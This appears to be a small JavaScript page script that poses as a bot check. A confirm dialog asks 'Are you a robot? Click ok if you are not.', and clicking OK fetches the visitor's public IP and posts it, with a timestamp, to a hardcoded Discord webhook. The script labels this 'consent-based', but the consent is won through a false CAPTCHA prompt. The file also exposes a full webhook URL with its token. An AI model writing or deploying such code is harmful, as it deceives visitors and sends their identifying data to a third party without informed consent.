const webhookUrl =
  "https://discord.com/api/webhooks/1513037739963056239/i9yc0CYlFbfGiQkxhE8m2xmYvIm9QCwGruuTRI3mPCbYHU51ECOtJhb2jBuPtEpKFIPs";

async function shareIpWithConsent() {
  const consent = confirm(
    "Are you a robot? Click ok if you are not."
  );

  if (!consent) return;

  try {
    const ipResponse = await fetch("https://api.ipify.org?format=json");
    if (!ipResponse.ok) throw new Error("Could not determine the IP address.");

    const { ip } = await ipResponse.json();

    const webhookResponse = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `Consent-based IP submission\nIP: ${ip}\nSubmitted: ${new Date().toISOString()}`,
        allowed_mentions: { parse: [] },
      }),
    });

    if (!webhookResponse.ok) {
      throw new Error("Discord rejected the submission.");
    }

    alert("Test passed");
  } catch (error) {
    console.error(error);
    alert("Test failed");
  }
}

shareIpWithConsent();